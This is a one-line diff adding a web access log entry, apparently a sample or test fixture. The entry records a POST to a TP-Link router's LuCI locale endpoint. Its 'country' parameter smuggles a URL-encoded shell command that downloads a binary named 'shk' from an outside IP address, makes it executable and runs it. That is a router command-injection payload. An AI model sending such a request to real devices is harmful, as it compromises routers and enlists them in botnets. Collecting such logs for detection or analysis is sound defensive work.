@@ -1,0 +1,1 @@
+1.2.3.4 - - [04/Jan/2020:08:41:43 +0000] "POST /cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 200 550 "-" "foobar"
